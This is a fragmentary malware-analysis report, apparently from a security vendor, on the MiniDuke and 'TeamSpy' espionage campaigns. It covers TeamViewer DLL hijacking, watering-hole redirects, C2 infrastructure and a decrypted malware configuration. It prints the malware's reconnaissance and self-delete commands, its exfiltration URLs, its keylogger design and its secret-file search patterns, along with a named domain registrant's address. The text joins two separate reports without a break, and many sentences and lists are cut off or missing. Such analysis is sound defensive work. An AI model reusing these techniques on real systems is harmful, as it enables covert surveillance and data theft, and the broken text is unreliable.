By collecting the logs from all the known command servers , we ' ve discovered connections from several high profile networks belonging to : By analyzing the logs from the command servers , we have observed 59 unique victims in 23 countries : Belgium , Brazil , Bulgaria , Czech Republic , Georgia , Germany , Hungary , Ireland , Israel , Japan , Latvia , Lebanon , Lithuania , Montenegro , Portugal , Romania , Russian Federation , Slovenia , Spain , Turkey , Ukraine , United Kingdom and United States .
The amount of high profile victims in this attack is notable and puts it on the same level with other advanced campaigns such as `` Red October '' .
To protect against these attacks , we recommend that you : ● Update Java to the latest version or simply remove it from the system if not used ● Update Microsoft Windows and Office to the latest versions ● Update Adobe Reader to the latest version ( see https : //www.adobe.com / support / security / bulletins / apsb13 - 07.html ) ● Block traffic to the following domains : ○ arabooks.ch ○ artas.org ○ tsoftonline.com ○ www.eamtm.com ○ news.grouptumbler.com ● Block traffic to the following IPs : ○ 200.63.46.23 ○ 194.38.160.153 ○ 95.128.72.24 ○ 72.34.47.186 ○ 188.40.99.143 ○ 85.95.236.114 ● Install a security solution capable of detecting these threats such as Kaspersky Internet Security 2013 and scan all emails and received documents ● Be wary of opening suspicious documents on your systems ; instead , use another computer without an Internet connection , a VM , or upload the document to Google Docs for viewing In addition , infected PDFs contain the following string , which can be used as a quick way to find them : `` @ 34fZ7E*p\ '' Based on our experience , this is a unique and very strange attack .
The many different targets hit in separate countries , together with the high profile appearance of the decoy documents and the weird backdoor functionality indicate an unusual threat actor .
Some of the elements remind us of both Duqu and Red October , such as the minimalistic approach , hacked servers , encrypted channels but also the typology of the victims .
The backdoor coding style reminds us of a malware writing group which is believed to be extinct : 29A .
The value 29A in hex means 666 , and perhaps not unsurprisingly , was also left by the attackers as a clue in the code : The 29A / 666 clue left in the code by the attackers 29A published their first malware magazine in December 1996 and were active until February 2008 , when ' Virusbuster ' , the last standing man announced the group 's dismissal .
The logs from the Command & Control servers indicate determination and quite a bit of success in compromising several high profile entities in various countries .
The stage 3 compilation timestamps indicate the attacker has been active for quite a while but still managing to remain undetected .
Perhaps one of the most important questions is : are these attacks related to the `` Itaduke '' attack that prompted the discovery of the PDF 0-day ? Or is it a separate entity that purchased the attack kit from the same source , which has a different agenda ? Or , is it perhaps another threat actor which captured the 0-day exploit and modified it for other purposes ? Unfortunately , there are still many unanswered questions .
Note : We detect the malware described here as HEUR : Backdoor . Win32.MiniDuke.gen , Backdoor . Win32.Miniduke while the documents with exploits are detected as Exploit . JS.Pdfka.giy .
For at least several years , a mysterious threat actor infiltrated and tracked , performed surveillance and stole data from governmental organisations , some private companies and human rights activists throughout the Commonwealth of Independent States ( CIS ) and Eastern European nations .
Some parts of this operation extended into Western nations and the Middle East as well , with victims in sectors such as energy and heavy industry manufacturing .
The attackers performed their intelligence gathering and surveillance partly using TeamViewer ( http : //www.teamviewer.com / en / index.aspx ) , a legitimate support software package commonly used for remote administration .
In addition , they deployed custom written intelligence gathering components and lateral movement utilities .
We are calling this threat actor the `` TeamSpy crew '' because of their preference for using the legal software TeamViewer as a main part of their toolset .
This covert cross - nation , cyber surveillance data theft and monitoring operation may not have recruited technical wizards for their team .
But the use of legitimate , signed software packages in addition to custom made software , along with various dll path hijack tricks , allowed the threat actor to conduct effective operations targeting hundreds of victims , including high level / high value individuals .
According to its web site , TeamViewer is a `` All - In - One Software for Remote Support and Online Meetings '' .
It is `` free for private use '' and is installed by `` more than 100,000,000 users spread over more than 200 countries '' .
Compared to Poison Ivy and other Remote Access Tools ( RATs ) that have been in the news for years , TeamViewer has an advantage which makes it attractive to cybercriminals : is comes signed , adding to its seeming legitimacy .
In addition to TeamViewer , the TeamSpy operations are supplemented by a variety of custom - built surveillance modules .
Instead of maintaining all operations with the TeamViewer RAT , the team developed their own reconnaissance and stealth modules .
These provide TeamSpy attackers with the following functionality : One interesting `` fingerprint '' of this operation is the inclusion of custom , hand - drawn icons in some of the attack tools .
Examples include : It seems that at least at heart , one of the TeamSpy crew members dreams of being a graphic artist .
Or maybe they tried to send security researchers a hidden message ? The toolset demonstrates clever , although lazy choices about legitimate software and certificate abuse , along with a minimal but effective effort at using simple and crude custom encryption algorithms .
We ' ve analyzed in depth two command and control servers used by the attackers but we are aware of several others used in the campaign .
The two servers we analyzed are `` politnews.org '' and `` bannetwork.org '' .
On the command and control servers , the attackers maintain tools and modules , some obfuscated and named as JPG files .
The '' .JPG
There are quite a few traces left by the attackers , which normally can give you hints about attaсkers ' profile .
For example , a keylogger tool used a system event called `` _ _ klgskot _ _ '' .
While `` klg '' stands for keylogger , `` skot '' is a Russian word meaning `` livestock '' .
There are many more Russian language traces in this malware toolkit .
The version of Teamviewer server which is used as a part of malware bundle is Russian localized .
It at least includes TeamViewer_Resource_ru.dll file which has a set of Russian strings used by the application .
A couple of other modules , while searching for files on the hard drive , looked for those containing `` pass '' , `` secret '' , and Russian equivalents `` парол '' and `` секрет '' .
In addition to Russian , there was a Georgian equivalent of `` secret '' , but written in the Latin alphabet : `` saidumlo '' .
In the recent Red October report , our research noted liberal use of Cyrillic characters throughout code and files ...
This is required to address files and directories that contain Cyrillic characters in their names '' .
Here is a screenshot demonstrating the system codepage switch in a malicious batch file : Just like Red October , TeamSpy components maintain the same sort of language switch to Cyrillic throughout code and files .
Here , we note that an entire TeamSpy SQLite database 's strings used to house stolen victim data , located on one of the major C2 , is specified to default to the Cyrillic character set .
Tables within the database are explicitly configured to use the Cyrillic character set .
Here is the log table , filled with victim check - in records : The statistic table , along with all of the others , are explicitly Cyrillic : Also , some specifics come from C & C domain names , such as `` bulbanews.org '' and `` kartopla.org '' .
The words `` bulba '' and '' kartopla '' are written in Latin - Belarusian and Latin - Ukrainian , both words mean `` a potato '' .
Interestingly , among ex - USSR countries , Belarusians are jokingly called `` bulbashi '' which means `` potato people '' due to the popularity of this vegetable in local agriculture .
One of the modules we found , called footer has LANG_RUSSIAN property set in the resource section of the executable .
Also , one of the database tables discovered at a C & C server contained some text in Russian written with latin alphabet : A rough translation of the highlighted strings from Russian to English : '' Obshie manevri .
Ispolzovat ' tolko s razreshenija S - a '' = `` General maneuvers .
Use only after approval of S - a '' .
This log file also shows intensive usage of Russian language in the file names : The filenames include `` можно выдавать '' which is translated as `` ready to spread '' , `` Проверка на прото '' meaning `` Protocol checks '' .
The most amusing part of this log is `` crypted_bulba '' which is translated as `` encrypted potato '' .
Everyone is familiar with baked potato or mashed potato , however this is our first touch with `` encrypted potato '' .
The SystemInfoSave module lists all files in the `` Program Files '' folder which are newer than the hard - coded date : `` 22 November 1963 '' .
The date is clearly an `` Easter Egg '' , with several important incidents linked this specific date : ● US President John F. Kennedy is assassinated in Dallas .
Our investigation of the team 's infrastructure centers around two domains used for command - and - control : `` politnews.org '' and `` bannetwork.org '' .
But clearly , the strategy guiding this team is to pull off multiple `` watering hole '' attacks , and sometimes pollute ad networks , inefficiently blanketing the region they are most interested in with malvertizing and redirections to their malicious sites .
These two servers have been heavily used over years of attack campaigns , with more recent servers receiving tens if not hundreds of hits in the past week .
The two servers resided at several hosts over the past decade , but from 2010 , both domains were maintained at Russian provider Host Telecom .
For the most part , these systems maintain identical toolsets , structure , software and accounts .
Both of these systems hosted an FTP server and an Apache HTTP web server , along with the same user accounts for running each .
The HTTP servers were used to serve `` job.txt '' , which maintained a set of system commands for agents checking in , among other files described below .
Interestingly , other files included `` html '' pages and exploits related to the well - known exploit kit `` Eleonore Exploit Pack '' , created and maintained by Exmanoize .
Also , one of the server scripts to collect infection success statistics mentions the Eleonore exploit kit by name : And one of the more recent , current sites , `` checkmeil.com '' , is serving both malicious java and pdf files .
Of course , just like Eleonore started serving couple of years ago , it defaults to deliver a malicious JAR file first , prior to other exploits potentially sent to the victim system .
The 2012 version of `` door.jar '' ( CVE-2012 - 0507 ) exploit is blocked proactively by our AEP functionality at runtime and detected by Kaspersky products as `` HEUR : Exploit . Java . CVE-2012 - 0507.gen '' .
A malicious PDF is served if the Java Runtime is not present on the system .
Our products detect this particular malicious file as Exploit . JS.Pdfka.gbf .
Most of the TeamSpy servers are using a free , Russian open source tool named `` ReaderRssPhp 1.0 '' .
This is a set of PHP scripts designed to `` read and display RSS feeds on your site '' .
Most likely , the attackers planned their attacks well in advance and built a set of web sites using these scripts to provide news aggregation channels serving content at least somewhat relevant to their target victims ' favorite web sites .
Over the past years , the attackers added exploit packs like Eleonore on their news aggregation sites .
Then , the attackers injected iframes into carefully selected web sites frequently visited by their target victims .
The iframes redirect these target visitors ( and some extras ) to their previously - prepared malicious sites .
For instance , redirections from `` konflikt.ru '' to the attackers ' `` bannetwork.org '' started in October 2005 .
In February 2006 , users were redirected from `` daymohk.org '' to '' bannetwork.org '' , followed by `` www.turkmenistan.gov.tm '' and `` chechentimes.net '' in March .
The list of infected watering hole sites continued to grow from there .
Attacks from the `` bannetwork.org '' site appear to have been related to the following links by at least February 2010 : bannetwork ( dot ) org/5058/spl/ bannetwork ( dot ) org/5058/spl / inc / function.php bannetwork ( dot ) org/5058/spl / ms-041.jpg bannetwork ( dot ) org/5058/spl / vx_2c.exe bannetwork ( dot ) org/5058/spl / new - ms-041.jpg Based on the server access stats , we were able to put together a thorough list of web sites which appear to have acted as referrers to the exploit packs .
Since the early infections , it appears that they have been compromised and redirecting visitors on and off until recently : daymohk.org chechenpress.info daymohk.chechenpress.org chechentimes.net caucasuslive.org kauna-talu.com.ua timorseada.org mediaf.org ichkeria.info kavkazanhaamash.com rusedina.org konflikt.ru forum.ladoshki.com shaheeds.org hghltd.yandex.com turkmenistan.gov.tm The command - and - control servers maintain a database of victims with their associated TeamViewer IDs and passwords .
These can be seen in the C2 online interface which lists the IP , last access time and the user status : The attacker can then connect to any of the online IPs using the known login / pass combination and silently spy on the victims .
The command and control servers we analyzed maintain the same `` /public_html '' file contents .
For logging infections and handling infected users , all C2 servers rely on a MySQL database to which all the scripts connect .
The username and password for the database connections are hardcoded in the C2 scripts , for instance : Several tables exist in the databases , named `` stat_TV '' , `` stat_TV_log '' , `` stat '' , `` stat2 '' , `` stat5058 '' , `` statistic '' .
These carry various information about the victims that connected to the C2 as well as unique data that allows the attackers to interact with them .
It seems that attackers outsourced much of their infiltration development work , utilizing exploit kits like Eleonore and others .
It is the upfront investment of vulnerability research and exploit development and expertise that are beyond the reach of many interested parties like TeamSpy that results in this outsourcing .
In addition to the commodity exploit packs , their sites are also known to spread the Ardamax keylogger , another cheap , commercially available surveillance package .
It collects statistics on malware incidents from around the world .
The TeamSpy attacks have been recorded in several countries around the world , with the highest number of incidents being in Russia and Ukraine .
Here 's a map of infections : In addition to the KSN reports , we were able to extract a list of victims from two command and control servers ' databases .
These are available to anyone who knows the URL which serves these lists .
For `` bannetwork.org '' we have the following list of registered victims : For `` news-top.org '' , we have the following list of victims : In both cases , Russia and Turkey appear as top targets , with other countries such as India , Sweden , Iran or US following .
It should be noted that the statistics from the command and control servers include only the victims that were infected with the Teamviewer - based package .
The command servers have bigger logs which possibly include many other victims , although the nature of these is impossible to determine because the respective database tables are not handled anymore by the existing scripts .
For instance , the C2 at `` bannetwork.org '' has an extended log of supposed victims , spanning for two years , with the earliest entry from 23 Sep 2011 and the latest from March 2013 .
A peak can be observed on Jan 2012 - when the attackers infected a large amount of victims , 323 .
In regards of victim 's profiles , in general , the IPs do not appear to hold useful information .
Some do belong to specific networks , however , it 's unclear if they are researchers or true victims .
A top of the ISPs for the victims at `` bannetwork.org '' include : We were able to identify several older samples which connect to the command and control domain `` countlist.org '' .
This domain appears to have been an active C2 between May 2010 - May 2011 .
The Google safe diagnostic page for this domain points to an interesting blog : The domain `` master-sudtyaib.narod.ru '' appears to host a blog dedicated to freeing the Russian political activist `` Alexander Sokolov '' ( for details : http : //www.fidh.org / IMG//pdf / obs_report_russia_sokolov.pdf ) .
The page does not appear to be malicious at the time of writing of this analysis , however , the file `` sokolov.html '' does have an injected iframe which points to another domain : The iframe points to `` countlist.org/xmps5060 '' , which was no longer available when we tested it .
The domain `` countlist.org '' has been sinkholed by Kaspersky Lab for security reasons .
Kaspersky name : Trojan - Ransom . Win32.PornoBlocker.aei Sends stolen information to hxxp : //www.politnews.org / dd_4.php , hxxp : //www.bannetwork.org / dd_4.php We were first alerted by attacks from unknown assailants which were using runtime patched Teamviewer as part of their toolset in May 2012 .
The attacks ( see https : //charter97.org / ru / news/2012/4/28/51488/ , story in Russian ) were using a number of .RU
These domains are now sinkholed by Kaspersky Lab .
In addition to these attacks , we discovered a number of other command and control servers used by attackers which employ the Teamviewer - based attack toolkit .
Based on our research , it seems the Teamviewer based trojans appeared in the Russian underground forums a couple of time ago and were readily available for purchase by interested parties .
At the moment , it is unclear if there is a connection between all these attackers ( such as the ones from the charter97.org story ) and the `` TeamSpy Crew '' .
The TeamSpy Crew differentiates itself by mostly using `` .org
On these command and control servers , they maintain a specific infrastructure and directory structure , for instance , serving the malicious `` TeamViewer.ico '' installer .
According to existing information , the TeamSpy crew has been active at least since 2008 , possibly going back to as early as 2004 if we are to believe the domain registration dates and consider the news aggregation channels .
During the years , the team has been focusing on attacking a variety of targets , ranging from activists and political to heavy industry and national information agencies .
Some of the aspects of this operation , such as keywords and usage of Russian terms remind us of Red October , although there are no direct links at the moment .
If we are to compare it to Red October , the TeamSpy Crew and the tools they use are far less sophisticated and professional .
To attack their targets , the TeamSpy crew relied on a variety of custom tools , designed to collect `` special '' and interesting documents , such as those containing the word `` secret '' in their names .
The special name `` saidumlo '' ( Georgian - `` secret '' ) probably indicates at least some of the victims were in Georgia or from Georgia .
The most recent method used by the TeamSpy crew involved the using of Teamviewer , a legal remote administration tool .
Since Teamviewer is normally used in a wide range of conditions , it is not normally detected by security software with default settings .
In addition , the modules are validated with digital signatures , once again , making them `` trustworthy '' to a range of whitelisting software .
Unlike Red October , where many IPs could be traced to Governments and Governmental institutions based on WHOIS data , in this case , the vast majority of IPs belong to ISPs which do not advertise such information .
In case of TeamSpy crew , except for a very few cases , the identity of the victims remains a mystery .
Mezhevaya , dom 26 , kv .
Created On : 2012 - 04 - 17 balabko @ i.ua Andrey Balabko ( ) Lugansk , Marksa 13 - 8 Lugansk , Luganskaya 91000 UA Known variants : The file is a PE EXE file written in Assembler .
This file is a special Dll module that uses a vulnerability in TeamViewer v6 known as Dll - hijacking .
If this file is stored in the same folder as TeamViewer.exe , then when TeamViewer is started it will show no warning , no popups , no systray icons and will silently continue working providing remote access to the infected machine .
This module not only disables TeamViewer popups but also extends its functionality to the classical HTTP bot supporting a set of commands .
This module installed with Teamviewer 6 allows the attackers to access computer desktop remotely , activate webcam or microphone , download or upload files to the infected machine and many more .
The Module execution starts from the initialization procedure .
First , the code searches for `` tv.cfg '' file in local directory and then common system paths , such as C : \Windows , C : \Windows\System32 .
The code uses non - standard way to pass some arguments to the called function .
This is most likely done to harden manual analysis or break automated analysis of the code .
If the tv.cfg file was n't found the process exits .
If it was found , the module gets unique system ID , which is a hashed value of system drive Volume Serial Number .
To hash the Volume Serial Number two types of hash algorithms are used : custom SHL / SHR / OR - based algorithm and then MD5 .
The result is stored in a hex - string which is used as a decryption key for the tv.cfg and part of the code in current file .
Alternatively a hash of 792 bytes of executable code from TeamViewer.exe is used for tv.cfg decryption .
After that the module decrypts tv.cfg using RC4 algorithm .
An example of decrypted tv.cfg is presented below : szUserAgent `` Mozilla5.0 '' szadminstat `` tv / getinfo.php '' szadminhost `` newslite.org '' szfilehost `` '' nTimeOut `` 10000 '' nStartIdleTime `` 60 '' nregKey `` '' szSubKey `` SOFTWARE\Microsoft\Windows\CurrentVersion\Run '' szValueName `` svchost '' szteampass `` 1234 '' nVideo `` 4 '' szlogftp `` bannetwork.org '' szusername `` [ removed ] '' szpassword `` [ removed ] '' szlogkey `` sysenter '' szlogstat `` log.php '' szpostdata `` id= '' nkilltvwin7 `` '' nkilltvwinXp `` '' nfakedel `` 1 '' After decrypting the config , the module checks if `` szadminhost '' is found inside .
If it is not there , the executions stops .
Then the module decrypts string data and extra code from its own data and code section .
The data is stored in TLS section of the parent process .
After using some of the file parts , the module overwrites them with 0-byte values to change the module in memory and possibly avoid detection or dumping of the module .
This is the end of initialization part .
Next , it starts main procedure , which loads export functions from the real avicap32.dll located in system directory ( C : \Windows\System32\ ) .
It also gets current Windows OS version and creates autorun key , under value specified in the tv.cfg .
Currently it is HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchost Then the module patches the hosting TeamViewer process .
It intercepts calls to the following system API functions : advapi32.dll : RegCreateKeyExW advapi32.dll : RegQueryValueExW kernel32.dll : CreateProcessW kernel32.dll : CreateMutexA kernel32.dll : CreateFileW kernel32.dll : CreateDirectoryW kernel32.dll : DeleteFileW shell32.dll : ShellExecuteExW user32.dll : SendMessageW user32.dll : CreateDialogParamW user32.dll : GetClassInfoExW user32.dll : RegisterClassExW user32.dll : CreateWindowExW user32.dll : IsWindowVisible user32.dll : GetDlgItem user32.dll : ShowWindow user32.dll : SetWindowTextW user32.dll : MessageBoxW wintrust.dll : WinVerifyTrust One of the functions , SetWindowTextW , is quite interesting and contains extra code to work with C2 .
This functions when it is executed the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get commands via HTTP GET request using parameters specified in tv.cfg : http : // < server > /tv / getinfo.php ? id= ...
In the second stage the module loads `` kl.dll '' library from the current directory and imports two functions : `` Init '' and `` Rdp '' .
After that it calls `` Init '' function , waits 32 milliseconds allowing kl.dll to initialize and calls `` Rdp '' function from the same library .
The result of that call is submitted to the C2 via HTTP Post with Content - Type : application / x - www - form - urlencoded header value .
In parallel a new thread is created , which waits for a signal to search * .bin files in the module directory , encrypt with szlogkey value from tv.cfg using RC4 algorithm and upload to the FTP server specified in the tv.cfg .
After uploading the files are deleted from the filesystem using simple DeleteFileA API call .
Locates current process main executable and checks file version and file attributes .
If the file version , stored in the file version info section is not equal to `` 6.0.10722.0 '' the process terminates .
If the attributes do not contain Hidden , System , then the attributes are set ( Hidden and System ) for the file and the process is restarted .
After that it will connect to the Command and Control ( C2 ) server and fetch updated modules by the following URLs : http : // < server name > / < filename > , where < server name > is a value from tv.cfg file ( newslite.org ) .
If other thread fires the event , the current thread goes through a list of embedded filenames , which includes kl.dll , avicap32.dll , tv.cfg and changes file attributes to Hidden and System ( which removes ReadOnly if set ) .
After that , the module deletes the following registry keys : This thread simply monitors creation of dangerous processes , such as taskmg.exe or procexp.exe .
If it finds any of these processes running , it immediately terminates three processes ( which ids are stored in current module memory ) and current process .
This is done in a never - ending loop with high priority – sleep time between check iterations is 1 millisecond .
The algorithm designed to have different process termination procedures for Windows NT 5.x and Windows NT 6.x , however currently it simply calls ExitProcess API function .
This thread searches for tvicap32.dll and tl.dll files in the directory of current executable .
It unloads tl.dll , if it is loaded and then attempts to delete both files in a loop with delay of 1 second until it succeeds .
Known variants : The file is a PE EXE file created in Borland Delphi .
This file is a tool to collect all local * .plist files from user 's Application Data directory .
Plist or property list files are files that store serialized objects on Apple operating systems .
These files may appear in Apple iTunes folders and may contain information about devices connected to the current system in the past .
This simple module gets searches for `` * .plist '' files in current user % APPDATA % directory .
All discovered files are immediately copied to a directory with hardcoded path `` % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm '' , where % SYSTEMDRIVE % is the system disk drive .
If the directory `` % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm '' does n't exist , the copying process silently fails .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
It is a tool designed to collect information about the operating system and BIOS via WMI .
The module concatenates a string to run a command with cmd.exe : cmd.exe /c wmic os get /format : HFORM > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html & & wmic bios list /format : HFORM > > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html Execution of the commands above concatenates two HTML reports which contain two tables with information about running OS and computer 's BIOS .
The attackers retrieve the following properties : Operation System properties : BIOS properties : After getting this information the module self - deletes by calling cmd.exe /c del < ModulePath > .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
This file is a tool to collect files basing on filename patterns .
The tool has internal code in the log file : 01.01.01 The main procedures starts from generating output file path and creating the corresponding file : % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll2.txt After that the code iterates through all available logical drives and searches for the files matching the following patterns : Information about discovered files will be saved in a temporary file created in % TEMP % folder and after the search is finished it will be copied to the following file : The temporary file name is created using GetTempFileNameA system API , which creates a temp file name of the following format : < uuuu > .TMP
When copying the log file the module prepends a special header , so that collected file information looks as following : The header probably contains internal shortened module name and version ( N2.0 ) with some hardcoded `` build i d '' ( 01.01.01.00 ) , followed by the numerical value of data length that starts after the `` ] '' character .
After copying the temporary log file is deleted with call to DeleteFileA .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 101'376 bytes .
Its main purpose it to dump contents of accessible network shares .
No remote file copying is done .
This tool simply collects information about the files such as file size and file last modification time .
This tool is very similar to the FileList2 tool with few difference : It does n't create a header in the log file and it has no internal tool ID .
It also uses different application icons and resource section language is LANG_RUSSIAN , SUBLANG_DEFAULT .
It also makes series of Sleep API additional calls probably to break signature based detections of some AV products .
The main procedures starts from generating output file path and creating the corresponding file : % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll2.txt The code makes a sequence of useless Sleep API calls , probably to break detection of some signature - based AV engines : After that the code iterates through all available logical drives and searches for the files matching the following patterns : Information about discovered files will be saved in a temporary file created in % TEMP % folder and after the search is finished it will be moved to the following file : The file has resource section which has 3 resources , 2 of them have resource language set to LANG_RUSSIAN , SUBLANG_DEFAULT .
Resource section contain icons of the application ( 48x48 , 64x64 , 128x128 ) : Known variants : The file is a PE EXE file compiled with Microsoft Visual C++ 2010 .
It has tiny size of 12288 bytes .
Its main purpose it to log keystrokes , copy text from clipboard and record foreground windows along with date / time and process names owning them .
This tool aggregates information in local folder and does n't upload it anywhere .
It has no network functions .
The main procedure starts from preparation to install current application in the system .
It creates a directory '' % APPDATA % \WCF Data Services '' and prepares several strings containing work paths : On Windows XP English with system drive C : the paths will be the following : LnkPath = C : \Documents and Settings\ < username > \Start Menu\Programs\Startup\WcfAudit.lnk LogPath = C : \ProgramData\Adobe\AdobeArm\ ExePath = C : \Documents and Settings\ < username > \Application Data\WCF Data Services\WcfAudit.exe XmlPath = C : \Documents and Settings\ < username > \Application Data\WCF Data Services\preferences.xml Next it checks existence of system event object named `` _ _ klgskot _ _ '' .
If that event is found , the application exits to prevent multiple instances of the application from running .
If event does n't exist it is created immediately .
Next it checks if current executable is called WcfAudit.exe .
If not it creates a shortcut file in the file referred above as LnkPath .
Current executable is copied to the path referred above as ExePath .
After that the process is restarted from ExePath .
If installation to the system is completed , the application starts three threads : Thread # 1 ( Selfremover ) This thread creates a system event object called `` _ _ klgkillsoft _ _ '' and waits for this event to be activated .
When something activates this event the thread removes the LNK file from Startup folder and renames current executable from WcfAudit.exe to file with a decimal number in the name and no extension .
The decimal number represents system tick counter value .
Thread # 2 ( Keylogger ) This thread sets low level Windows keyboard hook , which allows the module to intercept keystrokes .
The thread records all keystrokes , foreground window names and textual clipboard data .
Accumulated data is available for the Thread # 3 which expects it in special buffer .
Thread # 3 ( Logger ) This thread is started 30 seconds after Thread # 2 .
It checks if XmlPath file referred above exists .
If it exists it is moved to LogPath directory , the name is changed to klg < Number > .klg
Then this file is opened and appended with new data received from Keylogger thread .
Please note , that at least empty file at XmlPath must be created , the keylogger starts saving collected data only if it finds file at XmlPath .
If the LogPath directory does n't exist , it will be created .
If the klg < Number > .klg
In the end LogPath directory is full of klg < Number > .klg
If the system is rebooted it will not contains XmlPath will not exist and that means that keylogger will not be active .
However it can still be activated any time by creating the XmlPath file .
The logs are stored in plaintext .
Below is a fragment of sample log from the keylogger module : * * * * * * * * * * * * * * * * * * * * * * * * * * * C : \Documents and Settings\User\My Documents\My Music * * * * * * * * * * * * * * * * * * * * * * * * * * * [ 18:47 - 13/03/2013 ; explorer.exe ; ] [ BACK ] [ BACK ] [ DOWN ] [ RIGHT ] [ LEFT ] [ RIGHT ] [ ENTER ] [ DOWN ] [ DOWN ] [ UP ] [ UP ] [ ENTER ] * * * * * * * * * * * * * * * * * * * * * * * * * * * Control Panel * * * * * * * * * * * * * * * * * * * * * * * * * * * [ 18:48 - 13/03/2013 ; explorer.exe ; ] [ LEFT ] [ LCTRL ] [ LEFT ] [ LSHIFT ] [ RIGHT ] [ LSHIFT ] C : \ [ ENTER ] Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 36'864 bytes .
Its main purpose it to dump contents of locally attached disk drives .
No file copying is done .
This tool simply collects information about the files such as file size and file last modification time .
This tool has internal code or `` build i d '' in the log file : 02.02.01 The main procedure starts from creating temporary file and prepare path for final output log , which is stored in '' % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm\sysdll2.txt '' .
After that a new thread is created which enumerates network accessible resources , including shared directories and network printers and lists available files which names match any of hardcoded patterns .
The log string has the following format ( listing data ) : < Filepath > < FileSize > < Date of modification > < Time of modification > The resulting log file is prepended with special header : [ /N2.0 - 02.02.01.00 : < size of data > ] < listing data > List of filename patterns , which are used by the tool : * .doc – MS Word documents * .rtf – RTF documents * pass * .
One of the resources contains the mysterious icon of the application : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 36'352 bytes .
Its main purpose it to list all new network servers and available network shares .
No file copying is done .
The tool is identical to NetScanFiles2 , but instead of getting full information about files , it works only with servers and shares .
This tool has internal code or `` build i d '' in the log file : `` 02.01.01 '' The main procedure starts from creating temporary file and prepare path for final output log , which is stored in '' % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm\sysdll2.txt '' .
After that a new thread is created which enumerates network accessible resources and outputs it to the temp file .
The log string has the following format : Server : < Server name > Share : < Share name > Domain : < Domain name > The resulting log file is prepended with special header : [ /N2.0 - 02.01.01.00 : < size of data > ] < collected data > The file has resource section which has 3 resources , 2 of them have resource language set to LANG_ENGLISH , SUBLANG_ENGLISH_US .
One of the resources contains the mysterious icon of the application : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 755'193 bytes .
Its main purpose is to drop and run a legitimate tool known as CmdCapture , which makes a screenshot and stores it in `` sysdll5.jpg '' file .
The main procedure starts from extracting data embedded in the file of current application .
The code prepares some working strings : CmdCapture = C : \ProgramDara\CmdCapture\CmdCapture.exe LogFile = C : \ProgramData\Adobe\AdobeArm\sysdll555.txt LogDir = C : \ProgramData\Adobe\AdobeArm\ It checks magic number stored in the last 4 bytes of the file .
It must be 0xFFFFAAAA .
If the magic is found , it reads preceding 4 bytes .
This DWORD value ( PayloadLen ) indicates the size of the embedded data .
Then it copies PayloadLen bytes and to the CmdCapture file and executes the following command : cmd.exe /c C : \ProgramDara\CmdCapture\CmdCapture.exe /d C : \ProgramData\Adobe\AdobeArm\ /f sysdll5.jpg > C : \ProgramData\Adobe\AdobeArm\sysdll555.txt After that it attempts to self - delete .
The dropped CmdCaptures.exe has the following features : This is a standalone EXE file which is a benign AutoIt script tool to make a screenshot from the command line .
This tool is publicly available for download , i.e .
Below is a part of it : CmdCapture 2.0 Usage : [ /d < directory > ] [ /f < filename > ] [ /h ] /d Select folder to output captured image files .
If you did n't specify file name with full path , or you left file name parameter blank , a file with default name will be put into the folder specified in this area .
The extension should be one of the following values : png : Save a PNG file .
The default file type is PNG .
Known variants : PAGE 43 | The ' TeamSpy ' Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013 The file is a PE EXE file created in Microsoft Visual C++ 2005 .
Its size is 32768 bytes .
Its main purpose is to collect general system information , including what software is installed , what services and processes are running on the system , information about available local storage and its free space , user accounts and BIOS information .
This tool has internal code in the log file : 02.03.01 The main procedure starts from creating a temp file ( TmpLog ) and preparing a path for the final report : % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm\sysdll2.txt ( FinalLog ) .
It runs series of commands and collects output : After that the output of all commands is aggregated in a single file FinalLog .
Every command output is prepended with a header in the following format : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 42496 bytes .
Its main purpose is to get information about local system in a safe way , which should n't trigger any security software , such as antivirus .
It is designed to collect information mostly about locally installed software .
The main procedure starts from creating a temp file to store preliminary tool report .
After that it lists all files in `` Program Files '' folder which are newer than hardcoded date : 22 November 1963 .
It collects environment variables from the following list : PAGE 45 | The ' TeamSpy ' Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013 After that the tool collects list of running processes , which includes executable name and process ID .
Collected data is then prepended with a header and moved to the following file : One of the resources has mysterious icon of the application : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 34816 bytes .
Its main purpose is to get information about local network configuration , including IP addresses , DNS servers and possibly domain name .
The main procedure is very simple and includes creating a command line for cmd.exe : This commands will collect information about local network IP address and subnet of current computer , as well as DNS servers , domain name anfooter.jpg.idbd dump ARP table , which contains temporary records of IP and MAC addresses of local network computers .
The module attempts to self - delete after execution by calling `` cmd.exe /c del < ModulePath > '' command .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 and packed with a Visual Basic wrapper .
Its size is 40.0 KB ( 40,960 bytes ) .
It is a dropper designed to copy , install itself , and maintain communcations with its C2 , maintain persistence , download further executable code , and enumerate windows looking for a browser to open and then log window contents .
Oddly , the module concatenates a couple of strings to run commands with cmd.exe and copy itself with several names , to several locations , with its final location residing in the All Users\Application Data directory and a run key for itself added .
First , it concats the string and copies itself to `` C : \Documents and Settings\All Users\Application Data\a - t_name.exe '' .
Then , it uses script commands to apply hidden attributes and further copy itself : This process immediately communicates with its hardcoded C2 at hxxp : //www.politnews.org / dd_4.php and hxxp : //www.bannetwork.org / dd_4.php , registering a unique identifier with its C2 .
